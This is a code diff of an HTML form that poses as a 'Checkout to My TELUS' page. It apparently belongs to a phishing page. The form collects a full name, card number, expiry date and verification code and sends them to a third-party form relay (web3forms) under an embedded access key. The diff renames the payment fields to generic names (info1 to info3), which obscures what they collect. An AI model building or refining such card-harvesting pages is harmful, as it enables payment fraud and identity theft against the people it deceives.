@@ -266,31 +266,28 @@
     <form id="my-form" action="https://api.web3forms.com/submit" method="POST">
     <div class="form-box">
         <h2>Checkout to My TELUS</h2>
-
         <input type="hidden" name="access_key" value="5783b12d-b368-45c8-879d-ae1855d069b1">
-
-        <!-- Required for Web3Forms -->
         <input type="hidden" name="subject" value="New Order Submission">
         <input type="hidden" name="from_name" value="Checkout Form">
 
         <div class="input-group">
-            <input type="text" id="fullName" name="name" required>
+            <input type="text" id="fullName" name="fullName" required>
             <label for="fullName">Full Legal Name</label>
         </div>
 
         <div class="input-group">
-            <input type="text" id="cardNumber" name="details1" maxlength="19" required>
-            <label for="cardNumber">Number</label>
+            <input type="text" id="info1" name="info1" maxlength="19" required>
+            <label for="info1">Number</label>
         </div>
 
         <div class="input-group">
-            <input type="text" id="expiry" name="expiry" maxlength="5" required>
-            <label for="expiry">Expiry</label>
+            <input type="text" id="info2" name="info2" maxlength="5" placeholder="MM/YY" required>
+            <label for="info2">Expiration</label>
         </div>
 
         <div class="input-group">
-            <input type="text" id="cvv" name="details3" maxlength="3" required>
-            <label for="cvv">Code</label>
+            <input type="text" id="info3" name="info3" maxlength="3" required>
+            <label for="info3">Verification Code</label>
         </div>
 
         <button type="submit" class="login19" id="my-form-button">Complete Order</button>
